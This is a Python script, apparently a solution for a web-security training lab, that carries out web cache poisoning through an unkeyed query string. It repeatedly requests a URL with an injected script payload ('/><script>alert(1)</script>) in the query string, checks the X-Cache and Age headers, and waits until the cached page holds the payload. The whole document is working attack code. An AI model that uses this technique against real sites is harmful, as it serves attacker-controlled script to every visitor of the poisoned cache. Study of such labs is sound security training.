# Web cache poisoning via an unkeyed query string

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import websocket
import ssl
import base64
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_sequence(s, url):
	s.cookies.clear()
	solved = False
	while solved == False:
		s.headers.clear()
		s.cookies.clear()
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
			solved = True
			break
		print('\n[+] Sending cache poisoning request...')
		cache_url = url + "/?gwyo='/><script>alert(1)</script>"
		headers = {'Origin': url}
		r = s.get(cache_url, headers=headers, allow_redirects=False)
		time.sleep(2)
		if "X-Cache" in r.headers:
			if r.headers['X-Cache'] == 'hit':
				s.headers.clear()
				r = s.get(cache_url, allow_redirects=False)
				if "X-Cache" in r.headers:
					if r.headers['X-Cache'] == "hit":
						print('[+] Cache poisoned')
						print('[+] Waiting %s seconds before retry...' % str(35 - int(r.headers['Age'])))
						time.sleep(35 - int(r.headers['Age']))
					else:
						print('[+] Received "X-cache: miss"...')
						time.sleep(2)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning via an unkeyed query string')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send Web Cache Poisoning attack...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			send_sequence(s, url)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
